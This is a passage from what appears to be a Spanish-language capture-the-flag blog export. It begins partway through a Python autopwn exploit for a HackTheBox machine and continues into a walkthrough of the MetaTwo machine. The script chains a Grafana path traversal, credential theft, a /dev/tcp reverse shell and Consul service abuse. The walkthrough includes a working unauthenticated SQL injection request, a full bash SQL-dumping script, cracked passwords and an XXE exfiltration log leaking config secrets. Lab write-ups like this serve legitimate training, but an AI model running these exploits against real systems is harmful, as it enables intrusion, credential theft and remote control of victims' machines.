time.sleep(3) self.get_database_path() self.extract_file(file=self.target_files[&#39;grafana_db&#39;]) progress.status(&#39;SQLite enumeration in Grafana database file&#39;); time.sleep(3) self.get_mysql_cred() progress.status(&#39;Login to Mysql with credentials&#39;); time.sleep(2) self.extract_ssh_cred() progress.status(&#39;Prepare .json and .sh file&#39;); time.sleep(3) self.prepare_files() progress.status(&#39;Creating Consul service to receive the shell&#39;); time.sleep(3) self.get_shell() def extract_file(self, file): try: with Session() as session: vulnerable_path = self.target_host[&#39;grafana_service&#39;] \\ + &#39;/public/plugins/&#39; \\ + choice(plugins) \\ + &#39;/..&#39;*8 \\ + file request = Request(method=&#39;GET&#39;, url=vulnerable_path) prepare_request = session.prepare_request(request) prepare_request.url = vulnerable_path response = session.send(prepare_request) if &#39;Plugin not found&#39; in response.text: exit(&#39;\\n[!] File not found.&#39;) else: if response.status_code == 200: file_name = file.split(&#39;/&#39;)[-1] # extract only file name with open(file_name, &#39;wb&#39;) as file: file.write(response.content) log.info(f&#39;(CVE-2021-43798) Extracted file -&amp;gt; {file_name}&#39;); time.sleep(1) except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error) def get_database_path(self): try: file_name = self.target_files[&#39;grafana_conf&#39;].split(&#39;/&#39;)[-1] # extract only file name with open(file_name, &#39;rb&#39;) as file: content = file.read() filter_data = findall(r&#39;;data = (.+)|;path = (.+)&#39;, content.decode(&#39;utf-8&#39;)) database_path = filter_data[0][0] + &#39;/&#39; + filter_data[1][1] self.target_files[&#39;grafana_db&#39;] = database_path except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error) def get_mysql_cred(self): try: file_name = self.target_files[&#39;grafana_db&#39;].split(&#39;/&#39;)[-1] # extract only file name with sqlite3.connect(file_name) as connection: cursor = connection.cursor() query = &#39;SELECT user, password FROM data_source&#39; response = cursor.execute(query) username, password = response.fetchone() self.target_credentials[&#39;mysql&#39;][&#39;user&#39;] = username self.target_credentials[&#39;mysql&#39;][&#39;pass&#39;] = password log.success(&#39;Mysql credentials -&amp;gt; {}:{}&#39;.format(username, password)); time.sleep(1) except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error) def extract_ssh_cred(self): try: connection = connector.connect(host=self.target_host[&#39;ip_address&#39;], database=&#39;whackywidget&#39;, user=self.target_credentials[&#39;mysql&#39;][&#39;user&#39;], password=self.target_credentials[&#39;mysql&#39;][&#39;pass&#39;]) if connection.is_connected(): cursor = connection.cursor() query = &#39;SELECT user, pass from users&#39; cursor.execute(query) username, b64_password = cursor.fetchone() # decode base64 password b64_bytes = b64_password.encode(&#39;ascii&#39;) msg_bytes = b64decode(b64_bytes) password = msg_bytes.decode(&#39;ascii&#39;).replace(&#39;\\n&#39;, &#39;&#39;) self.target_credentials[&#39;ssh&#39;][&#39;user&#39;] = username self.target_credentials[&#39;ssh&#39;][&#39;pass&#39;] = password log.success(&#39;SSH credentials -&amp;gt; {}:{}&#39;.format(username, password)); time.sleep(1) except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error) finally: if connection.is_connected(): cursor.close() connection.close() def ssh_connection(self, user, password): try: ssh_client = SSHClient() ssh_client.set_missing_host_key_policy(AutoAddPolicy()) ssh_client.connect(self.target_host[&#39;ip_address&#39;], port=22, username=user, password=password) return ssh_client except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error) def get_consul_token(self, ssh_client): try: command = &quot;cd /opt/my-app/ &amp;amp;&amp;amp; git show&quot; # path repository _stdin, _stdout, _stderr = ssh_client.exec_command(command) output = _stdout.read().decode(&#39;utf-8&#39;) token = findall(r&#39;--token (.*?) &#39;, output)[0] self.target_credentials[&#39;consul&#39;][&#39;token&#39;] = token log.success(&#39;Consul token -&amp;gt; {}&#39;.format(token)); time.sleep(1) except Exception as error: exit(&#39;\\n[x] Error %s:&#39; % error) def prepare_files(self): # reverse shell file shell_data = &quot;#!/bin/bash\\n\\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1&quot;.format(self.args.ip, self.args.port) with open(self.shell_file, &#39;w&#39;) as file: file.write(shell_data) log.info(&#39;File created : {}&#39;.format(self.shell_file)); time.sleep(1) # consul service RCE file json_data = { &quot;ID&quot;: &quot;autopwn_shell&quot;, &quot;Name&quot;: &quot;pwn&quot;, &quot;Address&quot;: &quot;127.0.0.1&quot;, &quot;Port&quot;: 80, &quot;Check&quot;: { &quot;DeregisterCriticalServiceAfter&quot;: &quot;90m&quot;, &quot;Args&quot;: [&quot;/bin/bash&quot;, f&quot;/tmp/.{self.args.ip}/shell.sh&quot;], &quot;Interval&quot;: &quot;10s&quot;, &quot;Timeout&quot;: &quot;86400s&quot; } } json_obj = dumps(json_data, indent=4) with open(self.json_file, &#39;w&#39;) as file: file.write(json_obj) log.info(&#39;File created : {}&#39;.format(self.json_file)); time.sleep(1) def upload_files(self, ssh_client): with ssh_client.open_sftp() as sftp_client: sftp_client.put(self.shell_file, &#39;/tmp/.{}/{}&#39;.format(self.args.ip, self.shell_file)) sftp_client.put(self.json_file, &#39;/tmp/.{}/{}&#39;.format(self.args.ip, self.json_file)) log.info(&#39;Uploaded files&#39;); time.sleep(1) def get_shell(self): try: ssh_client = self.ssh_connection(user=self.target_credentials[&#39;ssh&#39;][&#39;user&#39;], password=self.target_credentials[&#39;ssh&#39;][&#39;pass&#39;]) # create workstation ssh_client.exec_command(&#39;mkdir -p /tmp/.{}&#39;.format(self.args.ip)) # get token and upload required files self.get_consul_token(ssh_client) self.upload_files(ssh_client) # create service and send root shell command = &quot;curl -X PUT &#39;http://localhost:8500/v1/agent/service/register?replace-existing-checks=true&#39;&quot; \\ + f&quot; -H &#39;X-Consul-Token: {self.target_credentials[&#39;consul&#39;][&#39;token&#39;]}&#39;&quot; \\ + f&quot; --data @/tmp/.{self.args.ip}/{self.json_file}&quot; ssh_client.exec_command(command) # listen mode to receive shell shell = listen(self.args.port, timeout=20).wait_for_connection() if shell.sock: log.info(&#39;Press Ctrl + D to exit.&#39;) shell.interactive() log.info(&#39;Removing service&#39;) # remove service command = &quot;curl -X PUT &#39;http://localhost:8500/v1/agent/service/deregister/autopwn_shell&#39;&quot; \\ + f&quot; -H &#39;X-Consul-Token: {self.target_credentials[&#39;consul&#39;][&#39;token&#39;]}&#39;&quot; ssh_client.exec_command(command) log.info(&#39;Removing workstation with uploaded files&#39;) # remove workstation ssh_client.exec_command(f&#39;rm -r /tmp/.{self.args.ip}&#39;) # close ssh connection ssh_client.close() except Exception as error: exit(&#39;\\n[x] Error: %s&#39; % error)## Main flowif __name__ == &#39;__main__&#39;: ascii_title = &#39;&#39;&#39; /\\ ._ _ |_ _. _ _ _. _| _ ._ /\\ _|_ _ ._ ._ /--\\ | | | |_) (_| _&amp;gt; _&amp;gt; (_| (_| (_) | /--\\ |_| |_ (_) |_) \\/\\/ | | | by marss &#39;&#39;&#39; parser = argparse.ArgumentParser( description=ascii_title, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&#39;&#39;&#39;\\nExample: autopwn.py -i 10.10.10.10 -p 4444 &#39;&#39;&#39;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, required=True, help=&#39;Specified IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, required=True, help=&#39;Specified PORT to receive the shell&#39;) args = parser.parse_args() print(ascii_title) exploit = Exploit(args) exploit.run() Poc Autopwn Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0" }, { "title": "Hackthebox Writeup Metatwo", "url": "/posts/HTBMetaTwo/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, CVE-2022-0739, CVE-2021-29447, SQLI, XXE, Information Leakage, Passpie", "date": "2022-11-15 23:57:17 -0500", "snippet": "Overview Worpress credentials by Unauthenticated SQL Injection (CVE-2022-0739) FTP credentials by Authenticated XXE Within the Media Library (CVE-2021-29447) SSH login by Information leak in FTP files (Foothold) Export of credentials in passpie by Gnupg key leak (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.186 29 Oct 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.186PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=139 ms \\______________________ Linux Machine--- 10.10.11.186 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 138.695/138.695/138.695/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:06 -05Nmap scan report for 10.10.11.186Host is up (0.15s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp \\_________________ File Transfer Protocol22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos 21(FTP) - 22(SSH) - 80(HTTP):❯ nmap -p21,22,80 -sCV 10.10.11.186 -oN open_ports_TCPStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 00:08 -05Nmap scan report for 10.10.11.186Host is up (0.14s latency).PORT STATE SERVICE VERSION21/tcp open ftp?| fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186]| Invalid command: try being more creative|_ Invalid command: try being more creative22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)| 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)|_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)80/tcp open http nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to http://metapress.htb/1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.93%I=7%D=11/16%Time=63747066%P=x86_64-pc-linux-gnu%r(GenSF:ericLines,8F,&quot;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10SF:\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20crSF:eative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativSF:e\\r\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapDe primeras nmap no nos muestra información interesante por el puerto 21(FTP). Por parte del puerto 22(SSH) observamos que la versión no es menor a la 7.7, lo cúal nos permitiría enumerar usuarios. Por ello, empezamos enumerando el servicio web del puerto 80(HTTP) que de primeras nos muestra una redirección al dominio metapress.htbYa que se aplica el concepto de Virtual hosting, lo que hacemos es agregar esta ruta a nuestro archivo del sistema que se encarga de asociar/resolver/apuntar una dirección ip a un nombre de dominio /etc/hosts : echo &#39;10.10.11.186 metapress.htb&#39; &amp;gt;&amp;gt; /etc/hostsAhora comenzamos a enumerar que tecnologías usa el dominio encontrado: Usando whatweb❯ whatweb metapress.htbhttp://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &amp;amp;#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]Lo que nos llama la atención es el uso del CMS Wordpress, a pesar de tener la versión no conseguimos encontrar alguna vulnerabilidad al respecto. Sin embargo, es muy común que las principales fallas de seguridad sean a través de los plugins que tienen instalados Enumeración manual en Wordpress: https://www.armourinfosec.com/wordpress-enumeration/Para ello hice un script en bash con el objetivo de aplicar la técnica de Web scraping y encontrar todas las urls disponibles:#!/bin/bash## Ctrl + c # (function)signal_handler(){ echo -e &quot;\\n[!] User terminated.&quot; tput cnorm; exit 1 # return cursor and exit}# (signal)trap signal_handler SIGINT## Functions# display help panelhelp(){ echo -e &quot;\\nDescription: Web scraping or website&quot; echo echo &quot;[*] Use: $0 target_url&quot; echo}# valid argumentsif [[ $# -ne 1 ]]then help tput cnorm; exit 1fi# get the urls of a websiteget_urls(){ local scan_depth_limit=$2 target_url=$1 local website_urls=$(curl -s $target_url | grep -oP &quot;href=[\\&quot;|&#39;](.*?)[\\&quot;|&#39;]&quot; | awk -F&#39;=&#39; &#39;{print $2}&#39; | tr -d &quot;\\&quot;&#39;&quot; | grep -vE &quot;^(#|//)&quot; | sort -u | xargs) IFS=&#39; &#39; read -ra website_urls_array &amp;lt;&amp;lt;&amp;lt; &quot;$website_urls&quot; ((scan_depth_limit--)) for url in &quot;${website_urls_array[@]}&quot; do if [[ &quot;$url&quot; != *&quot;$target_domain&quot;* ]] then continue fi echo $url echo $url &amp;gt;&amp;gt; all_urls.txt if [[ ! $scan_depth_limit -eq 0 ]] then get_urls &quot;$url&quot; $scan_depth_limit &amp;amp; else return fi done; wait}# Main flow# ---------tput civis # hice cursor (esthetic)scan_depth_limit=4echo -n &#39;&#39; &amp;gt; all_urls.txt # create file to save urlstarget_domain=$(echo $1 | awk -F&#39;//&#39; &#39;{print $2}&#39; | tr -d &#39;\\n&#39;) # only find with specific domainecho -e &quot;\\n[*] Scanning site: $1\\n&quot;get_urls &quot;$1&quot; $scan_depth_limit # call function (recursive)echo -e &quot;\\n[+] Saving output: all_urls.txt&quot;cat all_urls.txt | sort -u | sponge all_urls.txt # filter unique urls and savetput cnorm # return cursor Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Al ejecutarlo abrimos el listados de las urls encontradas:❯ cat all_urls.txt───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: all_urls.txt───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ http://metapress.htb/ 2 │ http://metapress.htb/about-us/ 3 │ http://metapress.htb/author/admin/ 4 │ http://metapress.htb/author/admin/feed/ 5 │ http://metapress.htb/category/news/ 6 │ http://metapress.htb/category/news/feed/ 7 │ http://metapress.htb/comments/feed/ 8 │ http://metapress.htb/events/ 9 │ http://metapress.htb/feed/ 10 │ http://metapress.htb/hello-world/ 11 │ http://metapress.htb/?p=1 12 │ http://metapress.htb/?p=19 13 │ http://metapress.htb/?p=21 14 │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10 15 │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10 16 │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10 17 │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10 18 │ http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10 19 │ http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1 20 │ http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1 21 │ http://metapress.htb/wp-includes/css/dist/block-library/style.min.css?ver=5.6.2 22 │ http://metapress.htb/wp-includes/css/dist/block-library/theme.min.css?ver=5.6.2 23 │ http://metapress.htb/wp-includes/wlwmanifest.xml 24 │ http://metapress.htb/wp-json/ 25 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F 26 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fabout-us%2F&amp;amp;#038;format=xml 27 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F 28 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fevents%2F&amp;amp;#038;format=xml 29 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F 30 │ http://metapress.htb/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fmetapress.htb%2Fhello-world%2F&amp;amp;#038;format=xml 31 │ http://metapress.htb/wp-json/wp/v2/categories/3 32 │ http://metapress.htb/wp-json/wp/v2/pages/19 33 │ http://metapress.htb/wp-json/wp/v2/pages/21 34 │ http://metapress.htb/wp-json/wp/v2/posts/1 35 │ http://metapress.htb/wp-json/wp/v2/users/1 36 │ http://metapress.htb/xmlrpc.php?rsd───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Oservamos el plugin bookingpress y su versión 1.0.10, con esta información podemos buscar vulnerabilidades asociadas como la siguiente: CVE-2022-0739 En caso que no encuentras la versión en la url, puedes leer información respecto al plugin en su archivo readme.txt : https://developer.wordpress.org/plugins/wordpress-org/how-your-readme-txt-works/Foothold ¿ Qué es bookingpress ? Bookingpress es un plugin de Wordpress que nos automatiza un sistema de programación (reservas de citas, pagos, auto-reserva) dirigida a industrias que ofrezcan un servicio que requiera estás característicasLa vulnerabilidad nos permite, como cualquier usuario no autenticado, inyectar código SQL y obtener respuesta sobre la base de datos por detrás.Veamos los pasos que debemos seguir: Debemos encontrar en la página web un sistema tipo reservas sobre un servicio De la página de servicios debemos extraer, del código fuente, el nonce “number user once” (ayuda a proteger la autorización sobre una URL) Solicitar una petición al archivo admin-ajax.php (archivo que ofrece apoyo a los plugins y themes al momento de realizar peticiones) e inyectar código SQL en en el parámetro total_service de la data por POSTPara el paso 1, con una enumeración rápida encontrarás la siguiente página:Y si nos si nos fijamos en la documentación de bookingpress tendremos el mismo formato: Tambíen si examinamos el código fuente encontraremos urls enlazadas al plugin bookingpressEn el paso 2, solo es cuestión de buscar en el código fuente el _wpnonce. Y por último 3, solicitamos la petición de la siguiente manera: Usando curl❯ curl -si &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; \\--data &#39;action=bookingpress_front_get_category_services&amp;amp;_wpnonce=b81f4b63a7&amp;amp;category_id=33&amp;amp;total_service=-1) UNION SELECT 1,2,3,4,5,6,7,8,group_concat(0x7c, version(), 0x7c)-- -&#39;HTTP/1.1 200 OKServer: nginx/1.18.0Date: Wed, 16 Nov 2022 20:12:41 GMTContent-Type: text/html; charset=UTF-8Transfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/8.0.24X-Robots-Tag: noindexX-Content-Type-Options: nosniffExpires: Wed, 11 Jan 1984 05:00:00 GMTCache-Control: no-cache, must-revalidate, max-age=0X-Frame-Options: SAMEORIGINReferrer-Policy: strict-origin-when-cross-origin[{&quot;bookingpress_service_id&quot;:&quot;1&quot;,&quot;bookingpress_category_id&quot;:&quot;2&quot;,&quot;bookingpress_service_name&quot;:&quot;3&quot;,&quot;bookingpress_service_price&quot;:&quot;$4.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;5&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;6&quot;,&quot;bookingpress_service_description&quot;:&quot;7&quot;,&quot;bookingpress_service_position&quot;:&quot;8&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;|10.5.15-MariaDB-0+deb11u1|&quot;,&quot;service_price_without_currency&quot;:4,&quot;img_url&quot;:&quot;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;}]Ahora solo es cuestión de listar la base de datos, así que hice un script en bash para ello:#!/bin/bash# CVE-2022-0739# -------------# Description: SQL injection via bookingpress_front_get_category_services AJAX action (unauthenticated users)## Author: Marss# Date: 08 Nov, 2022# Ctrl + c# (function)signal_handler(){ echo -e &quot;\\n[!] User terminated.&quot; tput cnorm; exit 1 # return cursor and exit}# (signal)trap signal_handler SIGINT## Functions# Display help panelhelp_panel(){ echo -e &quot;\\nCVE-2022-0739&quot; echo -e &quot;-------------&quot; echo echo -e &quot;[*] Use: $0 -u target_url -d database -t table -c column&quot; echo}# extract nonce of target urlextract_nonce(){ echo $(curl -si &quot;$target_url/events/&quot; | grep -oP -m 1 &quot;_wpnonce:&#39;(.*?)&#39;&quot; | awk -F&#39;:&#39; &#39;{print $2}&#39; | tr -d &quot;&#39;\\n&quot;)}# query modesget_databases(){ echo &quot;-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -&quot;}get_tables_len(){ tables_data=&quot;-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$2-- -&quot; output=$(make_injection $1 &quot;$tables_data&quot;) tables_len=$(echo $output | awk -F&#39;,&#39; &#39;{print NF}&#39; | tr -d &#39;\\n&#39;) echo $tables_len}get_tables(){ echo &quot;-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$1 group by table_name ASC limit 0,$2-- -&quot;}get_table_number(){ table_number=$(echo $2 | tr &#39; &#39; &#39;\\n&#39; | grep -n $1 | awk -F &#39;:&#39; &#39;{print $1}&#39; | tr -d &#39;\\n&#39;) echo $table_number}get_columns(){ echo &quot;1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_schema$1 group by table_name ASC limit $2,1-- -&quot;}get_values(){ echo &quot;-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, $1, 0x7c) from $2.$3-- -&quot;}# select injection typeget_injection_type(){ if [[ $database == &quot;blog&quot; ]] then database_name=&quot;=database()&quot; else database_name=&quot;!=database()&quot; fi if [[ $target_url &amp;amp;&amp;amp; ! $database &amp;amp;&amp;amp; ! $table &amp;amp;&amp;amp; ! $column ]] then get_databases elif [[ $target_url &amp;amp;&amp;amp; $database &amp;amp;&amp;amp; $table &amp;amp;&amp;amp; $column ]] then get_values $column $database $table elif [[ $target_url &amp;amp;&amp;amp; $database &amp;amp;&amp;amp; $table ]] then tables_len=$(get_tables_len $user_nonce $database_name) tables_injection=$(get_tables $database_name $tables_len) tables_output=$(make_injection $user_nonce &quot;$tables_injection&quot;) table_number=$(get_table_number $table &quot;$tables_output&quot;) output=$(get_columns $database_name $table_number) echo $output elif [[ $target_url &amp;amp;&amp;amp; $database ]] then tables_len=$(get_tables_len $user_nonce $database_name) get_tables $database_name $tables_len fi}# insert sql injectionmake_injection(){ user_nonce=$1 payload_injection=$2 echo $(curl -s &quot;$target_url/wp-admin/admin-ajax.php&quot; \\ --data &quot;action=bookingpress_front_get_category_services&amp;amp;_wpnonce=$user_nonce&amp;amp;category_id=1&amp;amp;total_service=$payload_injection&quot; \\ | grep -oP &quot;\\&quot;\\|(.*?)\\|\\&quot;&quot;)}# start sql injection attackstart_attack(){ user_nonce=$(extract_nonce) payload_injection=$(get_injection_type) output=$(make_injection $user_nonce &quot;$payload_injection&quot;) echo echo $output | tr &#39;,&#39; &#39; &#39; | tr &#39; &#39; &#39;\\n&#39; | tr -d &#39;&quot;&#39; echo}## Main flow# No argumentsif [ &quot;$#&quot; -eq 0 ]then help_panel exit 1fitput civis # hide cursor# Valid optionswhile getopts &quot;:hu:d:t:c:&quot; optiondo case $option in h) # display help panel help_panel tput cnorm; exit;; u) # save target url target_url=$OPTARG;; d) # save database name database=$OPTARG;; t) # save table name table=$OPTARG;; c) # save column name column=$OPTARG;; \\?) # invalid option echo -e &quot;\\n[x] Error: Invalid option.&quot; tput cnorm; exit;; esacdone; tput cnorm # return cursor# insert injection to target urlstart_attack Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Ahora ejecutamos el script y conseguimos el hash de las contraseñas del usuario admin y manager:❯ bash sql_injection.sh -u &quot;http://metapress.htb&quot; -d &quot;blog&quot; -t &quot;wp_users&quot; -c &quot;user_pass&quot;|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.||$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70| El prefix $P$ corresponse al tipo de hash PHPass, él cual usa Wordpress para mayor protección en sus contraseñasYa que disponemos de hashes, lo que hacemos es usar John the Ripper para crackearlas:❯ cat dumb_hashes───────┬─────────────────────────────────────────────────────────────────────────────────────────── │ File: dumb_hashes───────┼─────────────────────────────────────────────────────────────────────────────────────────── 1 │ admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. 2 │ manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70───────┴───────────────────────────────────────────────────────────────────────────────────────────❯ john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt dumb_hashesUsing default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 3 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager) 1g 0:00:00:58 10.34% (ETA: 16:11:53) 0.01720g/s 28378p/s 30281c/s 30281C/s junabhe..jumbo8Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliablySession abortedAl final solo consiguimos crackear las credenciales manager:partylikearockstar, y como son de wordpress procedemos a logearnos en wp-login.php:Como ya estamos autenticados y tenemos la version del Wordpress (fase de enumeración). Al buscar vulnerabilidades como usuarios autenticados y de la versión 5.6.2, encontramos lo siguiente: CVE-2021-29447En resumen, gracias a que la funcionalidad de la subida de archivos .wav es vulnerable a una inyección XML external entity (XXE), podemos extraer archivos importantes del sistema.Debemos tener lo siguiente: Archivo .dtd (Document Type Definition) con lenguaje XML que a nivel de sistema, por medio de wrapper de php, extraiga el archivo que solicitemos y luego realize una petición a nosotros usando como parámetro de la solicitud el archivo anteriormente requerido Archivo .wav con código XML inyectado para que ejecute en el sistema una petición hacia nuestro archivo .dtd Abrir un servidor para compartir nuestro archivo y ver las peticiones que nos realizará la máquina objetivo Para una explicación más detallada sobre la explotación de esta vulnerabilidad te recomiendo el siguiente articulo: https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/Después de diseñar bien nuestros archivos intentamos extraer el archivo de configuración de Wordpress wp-config.php:❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.186 - - [16/Nov/2022 16:39:18] &quot;GET /poc.dtd HTTP/1.1&quot; 200 -10.10.11.186 - - [16/Nov/2022 16:39:18] &quot;GET /?PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9